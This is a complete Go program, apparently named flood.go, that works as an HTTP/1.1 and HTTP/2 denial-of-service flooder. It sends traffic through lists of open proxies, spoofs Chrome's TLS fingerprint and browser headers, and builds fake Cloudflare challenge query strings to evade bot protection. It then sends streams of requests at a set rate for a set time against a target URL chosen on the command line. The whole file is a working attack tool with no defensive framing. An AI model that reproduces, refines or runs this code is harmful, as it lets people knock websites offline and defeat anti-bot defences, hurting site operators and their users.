package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	target      string
	reqMethod   string
	attackTime  int
	threads     int
	rateLimit   int
	proxyFile   string
	debug       bool
	fullMode    bool
	query       string
	cookieVal   string
	referer     string
	postData    string
	customIP    string
	customUA    string
	customHdrs  string
	delay       int
	httpVersion string
	winter      bool
)

func init() {
	flag.StringVar(&reqMethod, "m", "GET", "HTTP method")
	flag.StringVar(&target, "u", "", "Target URL")
	flag.IntVar(&attackTime, "t", 60, "Attack duration in seconds")
	flag.IntVar(&threads, "th", 16, "Number of threads")
	flag.IntVar(&rateLimit, "r", 100, "Requests per second per connection")
	flag.StringVar(&proxyFile, "p", "proxy.txt", "Proxy file")
	flag.BoolVar(&debug, "d", false, "Debug mode")
	flag.BoolVar(&fullMode, "full", false, "Backend large mode")
	flag.StringVar(&query, "q", "", "Query type (1/2/3)")
	flag.StringVar(&cookieVal, "cookie", "", "Cookie")
	flag.StringVar(&referer, "ref", "", "Referer")
	flag.StringVar(&postData, "data", "", "POST data")
	flag.StringVar(&customIP, "ip", "", "Custom proxy IP:port")
	flag.StringVar(&customUA, "ua", "", "Custom User-Agent")
	flag.StringVar(&customHdrs, "hdr", "", "Custom headers (name:value#name:value)")
	flag.IntVar(&delay, "delay", 0, "Delay between connections (ms)")
	flag.StringVar(&httpVersion, "http", "2", "HTTP version (1/2/mix)")
	flag.BoolVar(&winter, "winter", false, "Legit header set")
	flag.Parse()
}

const (
	chromeVersion = 146
	chromeUA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
	secChUa       = `"Chromium";v="146", "Not:A-Brand";v="24", "Google Chrome";v="146"`
	preface       = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randStrExt(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func buildQuery(path string, q string) string {
	ts := strconv.FormatInt(time.Now().Unix(), 10)
	switch q {
	case "1":
		return path + "?__cf_chl_rt_tk=" + randStrExt(30) + "_" + randStrExt(12) + "-" + ts + "-0-gaNy" + randStrExt(8)
	case "2":
		return path + "?" + randStr(6) + "&" + randStr(6)
	case "3":
		return path + "?q=" + randStr(6) + "&" + randStr(6)
	default:
		return path
	}
}

func buildHeaders(targetURL *url.URL) []hpack.HeaderField {
	refs := []string{"same-site", "same-origin", "cross-site"}
	ref := refs[rand.Intn(len(refs))]
	refVal := referer
	if refVal == "rand" {
		refVal = "https://" + randStr(6) + ".net"
	}

	path := targetURL.Path
	if query != "" {
		path = buildQuery(path, query)
	} else if postData != "" {
		path += "?" + postData
	}

	ua := customUA
	if ua == "" {
		ua = chromeUA
	}

	hdrs := []hpack.HeaderField{
		{Name: ":method", Value: reqMethod},
		{Name: ":authority", Value: targetURL.Hostname()},
		{Name: ":scheme", Value: "https"},
		{Name: ":path", Value: path},
		{Name: "cache-control", Value: "max-age=0"},
		{Name: "sec-ch-ua", Value: secChUa},
		{Name: "sec-ch-ua-mobile", Value: "?0"},
		{Name: "sec-ch-ua-platform", Value: `"Windows"`},
		{Name: "upgrade-insecure-requests", Value: "1"},
		{Name: "user-agent", Value: ua},
		{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
		{Name: "accept-language", Value: "en-US,en;q=0.7"},
	}

	if rand.Intn(100) < 70 {
		hdrs = append(hdrs, hpack.HeaderField{Name: "sec-fetch-site", Value: ref})
	}
	if rand.Intn(100) < 70 {
		hdrs = append(hdrs, hpack.HeaderField{Name: "sec-fetch-mode", Value: "navigate"})
	}
	if rand.Intn(100) < 50 {
		hdrs = append(hdrs, hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	}
	if rand.Intn(100) < 70 {
		hdrs = append(hdrs, hpack.HeaderField{Name: "sec-fetch-dest", Value: "document"})
	}
	if cookieVal != "" {
		hdrs = append(hdrs, hpack.HeaderField{Name: "cookie", Value: cookieVal})
	}
	if refVal != "" {
		hdrs = append(hdrs, hpack.HeaderField{Name: "referer", Value: refVal})
	}
	if customHdrs != "" {
		for _, h := range strings.Split(customHdrs, "#") {
			parts := strings.SplitN(h, ":", 2)
			if len(parts) == 2 {
				hdrs = append(hdrs, hpack.HeaderField{Name: strings.ToLower(strings.TrimSpace(parts[0])), Value: strings.TrimSpace(parts[1])})
			}
		}
	}
	if reqMethod == "POST" {
		hdrs = append(hdrs, hpack.HeaderField{Name: "content-length", Value: "0"})
	}
	return hdrs
}

func connectProxy(proxyHost string, proxyPort int, targetHost string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(proxyHost, strconv.Itoa(proxyPort)), 10*time.Second)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nProxy-Connection: Keep-Alive\r\n\r\n", targetHost, targetHost)
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	br := bufio.NewReader(conn)
	resp, err := br.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, err
	}
	if !strings.Contains(resp, "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp)
	}
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			conn.Close()
			return nil, err
		}
		if line == "\r\n" {
			break
		}
	}
	return conn, nil
}

func tlsConnect(conn net.Conn, host string, useHTTP1 bool) (*utls.UConn, error) {
	config := &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}
	if useHTTP1 {
		config.NextProtos = []string{"http/1.1"}
	} else {
		config.NextProtos = []string{"h2", "http/1.1"}
	}
	uconn := utls.UClient(conn, config, utls.HelloChrome_146)
	if err := uconn.Handshake(); err != nil {
		return nil, err
	}
	return uconn, nil
}

func buildHTTP1Request(targetURL *url.URL) string {
	path := targetURL.Path
	if query != "" {
		path = buildQuery(path, query)
	}
	req := fmt.Sprintf("%s %s HTTP/1.1\r\n", reqMethod, path)
	req += fmt.Sprintf("Host: %s\r\n", targetURL.Hostname())
	req += fmt.Sprintf("User-Agent: %s\r\n", chromeUA)
	req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
	req += "Accept-Encoding: gzip, deflate, br, zstd\r\n"
	req += "Accept-Language: en-US,en;q=0.7\r\n"
	req += "Cache-Control: max-age=0\r\n"
	req += "Connection: keep-alive\r\n"
	req += "Upgrade-Insecure-Requests: 1\r\n"
	req += "sec-ch-ua: " + secChUa + "\r\n"
	req += "sec-ch-ua-mobile: ?0\r\n"
	req += "sec-ch-ua-platform: \"Windows\"\r\n\r\n"
	return req
}

func writeHeadersFrame(framer *http2.Framer, streamID uint32, headers []hpack.HeaderField) error {
	var hbuf bytes.Buffer
	henc := hpack.NewEncoder(&hbuf)
	for _, h := range headers {
		if err := henc.WriteField(h); err != nil {
			return err
		}
	}
	frameData := []byte{0x80, 0x00, 0x00, 0x00, 0xFF}
	frameData = append(frameData, hbuf.Bytes()...)
	return framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: frameData,
		EndStream:     true,
		EndHeaders:    true,
	})
}

func worker(proxyList []string, targetURL *url.URL, wg *sync.WaitGroup) {
	defer wg.Done()

	var proxyHost string
	var proxyPort int
	if customIP != "" {
		host, portStr, err := net.SplitHostPort(customIP)
		if err != nil {
			return
		}
		proxyHost = host
		proxyPort, _ = strconv.Atoi(portStr)
	} else {
		proxy := proxyList[rand.Intn(len(proxyList))]
		host, portStr, err := net.SplitHostPort(proxy)
		if err != nil {
			return
		}
		proxyHost = host
		proxyPort, _ = strconv.Atoi(portStr)
	}

	conn, err := connectProxy(proxyHost, proxyPort, targetURL.Hostname())
	if err != nil {
		return
	}
	defer conn.Close()

	useHTTP1 := false
	if httpVersion == "1" {
		useHTTP1 = true
	} else if httpVersion == "mix" {
		useHTTP1 = rand.Intn(2) == 0
	}
	uconn, err := tlsConnect(conn, targetURL.Hostname(), useHTTP1)
	if err != nil {
		return
	}
	defer uconn.Close()

	if useHTTP1 {
		payload := buildHTTP1Request(targetURL)
		ticker := time.NewTicker(time.Second / time.Duration(rateLimit))
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if _, err := uconn.Write([]byte(payload)); err != nil {
					return
				}
			}
		}
	}

	framer := http2.NewFramer(uconn, uconn)
	if _, err := uconn.Write([]byte(preface)); err != nil {
		return
	}

	settings := []http2.Setting{
		{ID: http2.SettingHeaderTableSize, Val: 65536},
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		{ID: http2.SettingInitialWindowSize, Val: 6291456},
		{ID: http2.SettingMaxFrameSize, Val: 16384},
		{ID: http2.SettingMaxHeaderListSize, Val: 262144},
	}
	if err := framer.WriteSettings(settings...); err != nil {
		return
	}
	if err := framer.WriteWindowUpdate(0, 15663105); err != nil {
		return
	}

	if debug {
		go func() {
			for {
				frame, err := framer.ReadFrame()
				if err != nil {
					return
				}
				switch f := frame.(type) {
				case *http2.HeadersFrame:
					hdec := hpack.NewDecoder(4096, nil)
					hf, err := hdec.DecodeFull(f.HeaderBlockFragment())
					if err == nil {
						for _, h := range hf {
							if h.Name == ":status" {
								fmt.Printf("Status: %s\n", h.Value)
							}
						}
					}
				case *http2.GoAwayFrame:
					fmt.Println("GOAWAY received")
					return
				case *http2.RSTStreamFrame:
					return
				}
			}
		}()
	}

	var streamID uint32 = 1
	ticker := time.NewTicker(time.Second / time.Duration(rateLimit))
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			headers := buildHeaders(targetURL)
			if err := writeHeadersFrame(framer, streamID, headers); err != nil {
				return
			}
			streamID += 2
		}
	}
}

func main() {
	if target == "" {
		fmt.Println("Usage: go run flood.go -u <target> -t <seconds> -th <threads> -r <rate> -p <proxyfile> [options]")
		flag.PrintDefaults()
		os.Exit(1)
	}
	targetURL, err := url.Parse(target)
	if err != nil || !strings.HasPrefix(targetURL.Scheme, "http") {
		fmt.Println("Invalid target URL")
		os.Exit(1)
	}

	proxyData, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Println("Error reading proxy file:", err)
		os.Exit(1)
	}
	proxyList := strings.Split(strings.TrimSpace(string(proxyData)), "\n")
	if len(proxyList) == 0 {
		fmt.Println("Proxy list empty")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(proxyList, targetURL, &wg)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}

	time.AfterFunc(time.Duration(attackTime)*time.Second, func() {
		os.Exit(0)
	})
	wg.Wait()
}